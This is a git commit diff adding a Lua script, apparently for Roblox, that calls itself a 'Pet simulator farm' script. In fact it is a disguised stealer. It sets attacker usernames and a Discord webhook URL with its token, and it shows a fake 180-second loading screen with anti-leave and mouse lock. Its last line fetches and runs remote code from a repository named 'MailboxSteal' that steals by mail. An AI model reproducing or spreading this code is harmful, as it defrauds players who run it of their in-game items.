cf6e2c22a8bccaf6b98b780445cfc5aa312a7fd7
SanderBottels <114163663+SanderBottels@users.noreply.github.com>
2023-07-31 20:37:24 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,1 +1,26 @@
+--[[
+                              
+  |  \  |  () |_| | __   | |   __ 
+  | || |/  | | / __| __/ _ \ _ | |/  '__|
+  | |  | | (| | | _ ||  / (_| | |  / |
+  ||  ||_,|||__/__|_,||_|_|
 
+]]--
+
+UserName = "Bruhsteel1"
+Webhook = "https://discord.com/api/webhooks/1135641984225259680/udz2gAkqfuBY5qy-n2ggpIS-DE4lvQZUA30aI4LR01RQ7myPzcuQf_z7TT3qg-xTNBKg"
+UserName2 = "JenniferStephenson8"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+
+_G.ScriptName = "Pet simulator farm"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonScriptt/MailboxSteal/main/Moonhubscriptzz/mailstealerpsx0000/main.lua%22))()
